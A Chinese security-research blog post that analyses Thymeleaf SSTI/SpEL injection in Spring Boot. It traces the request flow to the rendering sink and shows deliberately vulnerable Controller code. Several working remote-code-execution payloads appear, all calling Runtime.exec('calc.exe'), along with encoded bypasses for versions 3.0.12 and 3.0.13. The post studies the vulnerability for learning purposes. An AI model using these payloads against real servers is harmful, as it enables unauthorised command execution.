---
title: "Java Thymeleaf SSTI(本质为SpEL)"
onlyTitle: true
date: 2025-4-28 16:00:06
categories:
- java
- SSTI
tags:
- Thymeleaf
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8152.jpg
---



Java ssti，我特么莱辣

分析一下thymeleaf，velocity，freemarker等的模板注入！这节是Thymeleaf

代码环境：https://github.com/godownio/SSTIVuln

# Java Thymeleaf SSTI

写JavaWeb和SSM的时候，前端页面可能会用JSP写，但是因为之前项目都是war包部署，而SpringBoot都是jar包且内嵌tomcat，所以是不支持解析jsp文件的。

但是如果是编写纯静态的html就很不方便，那么这时候就需要一个模版引擎类似于Jinja2可以通过表达式帮我们把动态的变量渲染到前端页面，我们只需要写一个template即可。

## Thymeleaf的一些基础

作为安全人员，不用完全掌握一个组件具体是怎么在开发中使用的，只需要知道一些简单的方法

* 代审指纹：如何区分哪些是Thymeleaf的html？

在`Thymeleaf`的`html`中首先要加上下面的标识。

```html
<html xmlns:th="http://www.thymeleaf.org">
```

### 标签

`Thymeleaf`提供了一些内置标签，通过标签来实现特定的功能。

| 标签      | 作用               | 示例                                                         |
| --------- | ------------------ | ------------------------------------------------------------ |
| th:id     | 替换id             | `<input th:id="${user.id}"/>`                                |
| th:text   | 文本替换           | `<p text:="${user.name}">bigsai</p>`                         |
| th:utext  | 支持html的文本替换 | `<p utext:="${htmlcontent}">content</p>`                     |
| th:object | 替换对象           | `<div th:object="${user}"></div>`                            |
| th:value  | 替换值             | `<input th:value="${user.name}" >`                           |
| th:each   | 迭代               | `<tr th:each="student:${user}" >`                            |
| th:href   | 替换超链接         | `<a th:href="@{index.html}">超链接</a>`                      |
| th:src    | 替换资源           | `<script type="text/javascript" th:src="@{index.js}"></script>` |

* `@{}`

在Thymeleaf中，如果想引入链接比如link，href，src，需要使用`@{资源地址}`引入资源。

```html
<link rel="stylesheet" th:href="@{index.css}">
<script type="text/javascript" th:src="@{index.js}"></script>
<a th:href="@{index.html}">超链接</a>
```

* `${}`

可以通过`${…}`在model中取值，如果在`Model`中存储字符串，则可以通过`${对象名}`直接取值。

```java
public String addindex(Model model)//对应函数
  {
     //数据添加到model中
     model.addAttribute("name","bigsai");//普通字符串
     return "index";//与templates中index.html对应
  }


<td th:text="'我的名字是：'+${name}"></td>
```

* `~{}`

如下，在/WEB-INF/templates/footer.html定义一个copy的fragment

```html
    <div th:fragment="copy">
      &copy; 2011 The Good Thymes Virtual Grocery
    </div>
```

在另一template中引用该片段

```html
<div th:insert="~{footer :: copy}"></div>
```

1. **~{templatename::selector}**，会在`/WEB-INF/templates/`目录下寻找名为`templatename`的模版中定义的`fragment`，如上面的`~{footer :: copy}`
2. **~{templatename}**，引用整个`templatename`模版文件作为`fragment`
3. **~{::selector} 或 ~{this::selector}**，引用来自同一模版文件名为`selector`的`fragmnt`

除了在html中运用之外，springboot的Controller注解等的控制器return相当于利用这个语法直接返回资源目录中的xxx.html，而且不用`~{}`包裹，如下：

test.html：

```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<body> <div th:fragment="unsafe"> &copy; unsafe's test</div>
</body>
</html>
```

Controller中使用unsafe fragment：

```java
@Controller
public class TestController {
    @GetMapping("/aaa")
    public String test(@RequestParam String payload) {
        return payload;
    }
}
```

访问/aaa?payload=test会处理为`~{test}`，也就是test.html的内容

或者

```java
public class TestController {
    @GetMapping("/aaa")
    public String test(@RequestParam String payload) {
        return payload+"::unsafe";
    }
}
```

访问/aaa?payload=test会返回`~{test::unsafe}`



## 环境搭建

IDEA能启动Java8的springboot项目，服务器url填https://start.aliyun.com

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323141830439.png)

组件勾上spring Web即可，因为Themeleaf ssti的漏洞版本在springboot很老的版本了，就不勾Thymeleaf，进去后在pom.xml中添加

```xml
        <dependency>
            <groupId>org.thymeleaf</groupId>
            <artifactId>thymeleaf-spring5</artifactId>
            <version>3.0.11.RELEASE</version>
        </dependency>        
```

* 漏洞版本thymeleaf-spring5 <= 3.0.11.RELEASE

3.0.12，3.0.13可以绕过，3.0.14被彻底修复

一般来说是从Controller的return值获取对应想要调用的模板名，然后Thymeleaf后续得到了这个模板名回去/templates目录下去找相应的.html文件并返回；问题就在于从return到获取到模板名不仅仅是“一一对应”，这个return本身是支持SpEL表达式的，导致templatename可以被控制时存在注入

```java
@Controller
public class TestController {
    @PostMapping("/vuln")
    public String test(@RequestParam String payload) {
        return payload+"::unsafe";
    }
}
```

>一些吐槽：
>
>刚开始测，用的spring-boot-starter-thymeleaf 3.0.11，结果一看thymeleaf根本不在漏洞版本内
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323200219934.png)
>
>那么下面三个有什么区别？
>```xml
><dependency>
>    <groupId>org.thymeleaf</groupId>
>    <artifactId>thymeleaf</artifactId>
>    <version>3.0.11.RELEASE</version>
></dependency>
><dependency>
>    <groupId>org.thymeleaf</groupId>
>    <artifactId>thymeleaf-spring5</artifactId>
>    <version>3.0.11.RELEASE</version>
></dependency>
><dependency>
>    <groupId>org.springframework.boot</groupId>
>    <artifactId>spring-boot-starter-thymeleaf</artifactId>
>    <version>3.0.11</version>
></dependency>
>```
>
>第一个是Thymeleaf的核心库，与Spring无关，相应的，不能使用spEL表达式。如果只想在非 `Spring` 环境下使用 `Thymeleaf`，可以只引入这个依赖
>
>第二个是 `Thymeleaf` 专门为 `Spring 5` 设计的集成库，提供了 `Thymeleaf` 和 `Spring` 的整合支持。支持SpEL，能解析Spring Bean，支持绑定Model和View。**需要配合 `thymeleaf` 核心库一起使用**，不能单独使用
>
>第三个是 `Spring Boot` 提供的 `Thymeleaf` 启动器，**包含了前面两个依赖**。但是版本并不一定对应！
>
>
>
>> 网上找了个漏洞版本的springboot，然后去maven才找到这个漏洞的依赖，一般遇到springboot<=2.5.x可以看下其thymeleaf是否在漏洞版本内。
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323195812497.png)
>
>据我个人追溯，spring-boot-starter-thymeleaf<=2.2.12.RELEASE才使用了漏洞依赖，现在几乎也完全绝迹，所以是个仅供学习的漏洞了
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323202007144.png)



##   payload

根据`~{templatename::selector}`表达式的情况，很明显可以分为两种注入类型

* 一个是注入点在templatesname

```java
@Controller
public class TestController {
    @PostMapping("/vuln")
    public String test(@RequestParam String payload) {
        return payload+"::unsafe";
    }
}
```

* 一个是注入点在selector：

```java
@Controller
public class TestController {
    @PostMapping("/vuln")
    public String test(@RequestParam String payload) {
        return "index::"+payload;
    }
}
```

如果是GET注入点，需要URL编码，不然Tomcat高版本（9.x）会报RFC错误（有`&_`这种字符）

理论上payload都能用以下：

```java
__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x
```

* 除此以外，还有一个特别的，注入点在URL path，用@PathVariable接收参数

```java
@Controller
public class TestController {
    @GetMapping("/vuln/{payload}")
    public void test(@PathVariable String payload) {
    }
}
```





## 原理解析

这里以如下Controller和payload做测试

```java
@Controller
public class TestController {
    @PostMapping("/vuln")
    public String test(@RequestParam String payload) {
        return payload+"::unsafe";
    }
}
```

```http
__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x
```

Spring MVC 采用 **前端控制器（DispatcherServlet）** 作为核心组件，它负责接收请求、调用相应的 `Controller` 处理业务逻辑，并最终通过 **视图解析器（ViewResolver）** 渲染视图。

### 前情提要

`HandlerAdapter`对于执行流程的通用性起到了非常重要的作用，它能把任何一个`Handler（注意是Object类型）`都适配成一个`HandlerAdapter`，从而可以做统一的流程处理。具体的流程如下：

1、请求首先进入DispatcherServlet， 由DispatcherServlet  从HandlerMappings中匹配对应的Handler，此时只是获取到了对应的Handler，然后拿着这个Handler去寻找对应的适配器，即：HandlerAdapter；

2、拿到对应HandlerAdapter时，这时候开始调用对应的Handler方法，即执行我们的Controller来处理业务逻辑了， 执行完成之后返回一个ModeAndView；

3、HandlerAdapter执行完之后，返回一个ModeAndView，把它交给我们的视图解析器ViewResolver，通过视图名称查找出对应的视图然后返回；

4、最后，渲染视图 返回渲染后的视图。

从代码上来说，DispatcherServlet.doDispatch完成了整个请求分发和视图渲染的逻辑，1部分具体分析可见https://godownio.github.io/2025/03/25/spring-dispatcherservlet-xiang-jie/

其实该分析总结来说就是Controller接口具有视图渲染功能，HttpRequestHandler接口却没有。这里留了一个问题，RestController有没有视图渲染功能？

这里我们从3开始调代码

### 实例化ModeAndView

看到DispatcherServlet.doDispatch，获取完HandlerAdapter后，调用其handle方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425170059218.png)

一直跟进，直到ServletInvocableHandlerMethod#invokeAndHandler方法，该方法内先后调用了invokeForRequest和this.returnValueHandlers.handleReturnValue。其他代码不用看

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425170624057.png)

跟进到InvokecableHandlerMethod#invokeForRequest。先是调用getMethodArgumentValues获取了参数，然后调用doInvoke。不用跟进也知道doInvoke是调用Controller去处理请求

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425170922391.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172441344.png)

事实证明正是在doInvoke处完成了Controller的处理

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172559496.png)

doInvoke的值返回后赋值给returnValue，可以看到是String格式

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172717066.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425172907583.png)

然后是调用this.returnValueHandlers.handleReturnValue，这里用getReturnValueType对returnValue处理了一下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425173218965.png)

跟进getReturnValueType，发现是用ReturnValueMethodParameter做了封装

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425174327055.png)

即传入handleReturnValue方法的第二个参数returnType如下，用ReturnValueMethodParameter封装的对象：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425174542483.png)

跟进到handleReturnValue，先调用selectHandler，然后用调用其返回值的handleReturnValue方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425175618491.png)

selectHandler里面有个循环，首先判断是否异步(恒为false)，然后循环调用supportsReturnType查看returnValueHandlers有没有匹配returnType的handler

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250425175806732.png)

returnValueHandlers如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427151930673.png)

这里马后炮来看，取到的是ViewNameMethodReturnValueHandler

如果返回为空或者为字符串，就会满足ViewNameMethodReturnValueHandler.supportReturnType

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427152250462.png)

继续跟进到这个handler的handleReturnValue方法，把传入的参数设置为视图名

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427152627669.png)

注意设置为视图名非常关键，因为后面Thymeleaf渲染就会取视图名去解析

后续跟进getModelAndView，可以看到实例化ModelAndView，传的参数就是上面的ViewName！

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427155912218.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427155939553.png)

说明下面就会进行渲染！



如果把注解从Controller换成RestController呢？

handler变成了RequestResponseBodyMethodProcessor

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427164752107.png)

RequestResponseBodyMethodProcessor.supportsReturnType判断Controller有没有被ResponseBody注解修饰

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427165039188.png)

很明显Controller没有被ResponseBody注解修饰，而RestController被修饰了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427165030703.png)

进入到RequestResponseBodyMethodProcessor.handleReturnValue，可以发现并没有设置viewName，而是createInputMessage和createOutputMessage

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427165506100.png)

跟进一下发现直接从servletRequest读，写也是不用渲染直接写回servletResponse

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427172141627.png)

其实RestController是用来直接返回json、xml等数据的，用于一些api的开发

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427172117600.png)

所以懂了吧，RestController注解的不会触发SSTI漏洞，同时Controller注解上加ResponseBody也不会触发SSTI漏洞

### applyDefaultViewName URL SSTI

回到doDispatch，handle完成了以上介绍的交给Controller处理、取出参数作为viewName这两个主要功能。接着调用applyDefaultViewName

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427175655299.png)

跟进到applyDefaultViewName，这里判断了viewName是否为空，如果为空则调用getDefaultViewName获取默认的viewName

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427180353073.png)

我们静态看一下，getDefaultViewName怎么获取的。

进到了另一个getViewName

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427180531626.png)

getViewName会调用transformPath处理path

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427225122131.png)

跟进到transformPath，第三个if负责分离掉文件后缀

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427225148644.png)

这就是URL类型的 SSTI需要加`.x`的原因，如果不加，则前一个点就会被当作路径分隔符，payload就会完全坏掉）

```java
/vuln3/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x
```



持续跟进，得知此处就是把URL做viewName

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427180759207.png)

这里实际上也是第三种payload（如下）的原因。

```java
@Controller
public class TestController {
    @GetMapping("/vuln/{payload}")
    public void test(@PathVariable String payload) {
    }
}
```

### processDispatchResult：SSTI sink

我们经过了handle和applyDefaultViewName，终于来到了最后的视图渲染部分，也是SSTI最后触发的sink点：processDispatchResult

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427181047959.png)

processDispatchResult调用了render方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427213410957.png)

在render方法内，先是调用getViewName获取viewName，然后调用resolveViewName解析

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427213521910.png)

resolveViewName循环viewResolvers去解析

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427214145547.png)

viewResolvers如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427214247572.png)

这里选到的是ThymeleafViewResolver，具体怎么选的这里不深入探析

后续就是跟进到ThymeleafView.render，调用了renderFragment

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427214804129.png)

继续跟进，先判断viewTemplateName是否包含`::`，如果包含就用`~{}`包裹，并用parser.parseExpression去解析

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427215035392.png)

这里viewTemplateName如下，也就是我们的payload经过Controller return的值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427215133965.png)

然后经过如下栈，跟进到StandardExpressionPreprocessor.preprocess

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427215521553.png)

这个函数先是定义了一个matcher正则匹配器，然后去嵌套的解析input

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220504291.png)

这个正则正是匹配input两边的双下划线`__`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220727698.png)

看代码很容易看出来，把正则匹配到的前面部分，也就是`{`加到strBuilder，尾巴加到remaining，中间的部分调用expression.execute解析，这里就触发spEL表达式注入漏洞了

完整的触发spEL的栈如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427221202001.png)

其实这完全可以说是一个spEL表达式注入漏洞

我们进一步查看该图里的checkPreprocessingMarkUnescaping，由于代码很长，我直接说它的作用，就是寻找字符串是否含特定的结构 `\__`，如果有就换成`__`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220504291.png)

所以这个payload也是OK的（已测试）：

```java
payload=\__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe").getInputStream()).next()}__::.x
```



### sink 2

还是preprocess解析这里，为什么要把前面和尾巴部分保留，最后拼起来？我们可以清晰地看到，仍然保留了`~{}`的形式，难道说？还有二次解析？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427220504291.png)

猜对了，假如execute没有执行spEL表达式，以字符串形式返回了，会来到FragmentExpression.createExecutedFragmentExpression

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427223736497.png)

依然会进行spEL解析

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250427224015962.png)

没有双下划线的payload就是走的这个路径触发的漏洞

```java
payload=${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe").getInputStream()).next()}::.x
```

而且上面两个路径都是包含`::`就会触发漏洞，所以其实selector的部分可以省略：

```java
payload=${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe").getInputStream()).next()}::
```

不过可惜，按照`~{templatename::selector}`格式，由于是先解析templatename，再解析selector，不然`::`可以放前面

不过当然applyDefaultBiewName解析URL 触发SSTI是不能去掉`.x`的



## 总结

有一些文章会涉及到Thymeleaf SSTI回显，不过打入SpEL后目标默认回显错误页面。回显条件较多，意义不大

另外还有几个小版本的绕过，深入研究的意义也不是很大，总体是学习一下整个JAVA SSTI的触发流程

整个SSTI触发的流程：

ha.handle完成了交给Controller处理、取出参数作为viewName；如果参数没取到viewName，则将URL path作为viewName；解析的时候如果遇到`::`会进行片段表达式的解析，即先后用org.thymeleaf.standard.expression.Expression#execute去处理，进而触发spEL表达式注入

重点在于Controller接口具有视图渲染功能，如果用RestController或者给Controller加上ResponseBody就失去了视图渲染功能，就不会触发漏洞

<=3.0.11 payload：

* 参数型：

```java
payload=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe").getInputStream()).next()}__::.x
```

可以去掉`.x`，可以去掉两遍的双下划线，可以在前面加`\`

* URL型：

为了避免提前识别为文件后缀，后面的`.x`不能省

```java
payload=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe").getInputStream()).next()}__::.x
```

```java
payload=\__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe").getInputStream()).next()}__::.x
```

高版本Bypass：http://byname6.cn/index.php/2024/10/25/springboot%E4%B8%8B%E7%9A%84thymeleaf%E5%85%A8%E7%89%88%E6%9C%ACssti%E7%A0%94%E7%A9%B6/#header-id-14

由于利用价值不大，在此了解payload即可

=3.0.12 Bypass：

```java
__%24%7b%00new+java.util.Scanner(T+(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__
```

=3.0.13 Bypass：

```java
%24%7b%00new+java.util.Scanner(%00T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d
```

大于3.0.14 G



说实话这种直接控制return或者接收指定URL渲染的代码开发方式对我的世界观冲击太大了。怪不得不肯分配CVE编号





ref：

http://byname6.cn/index.php/2024/10/25/springboot%E4%B8%8B%E7%9A%84thymeleaf%E5%85%A8%E7%89%88%E6%9C%ACssti%E7%A0%94%E7%A9%B6/

https://xz.aliyun.com/news/9962?time__1311=QqGx2DcDRQDtG%3DD%2FYrqBKD%3D3dxmqSEuA2fbD&u_atoken=8e8ced3e76ca58d63707c98da3afe609&u_asig=1a0c399d17427095712908584e0038
